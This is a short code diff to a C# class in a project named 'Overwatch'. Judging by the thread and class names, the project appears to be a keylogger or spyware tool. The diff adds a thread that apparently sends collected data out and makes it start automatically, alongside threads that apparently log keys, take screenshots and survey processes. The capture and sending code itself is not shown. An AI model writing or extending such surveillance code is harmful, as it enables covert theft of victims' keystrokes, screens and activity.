@@ -1,9 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Threading;
+﻿using System.Threading;
 
 namespace Overwatch
 {
@@ -15,13 +10,14 @@ namespace Overwatch
         private static cSendingInformation s = new cSendingInformation();
         private static Thread KeyThread = new Thread(k.Start);
         private static Thread ScreenThread = new Thread(info.ScreenShoot);
-        
+        private static Thread SendingThread = new Thread(s.Sending);
         private static Thread ProcessThread = new Thread(info.Overview);
-        public void Start()
+        public cThread()
         {
             KeyThread.Start();
             ScreenThread.Start();
             ProcessThread.Start();
+            SendingThread.Start();
         }
     }
 }
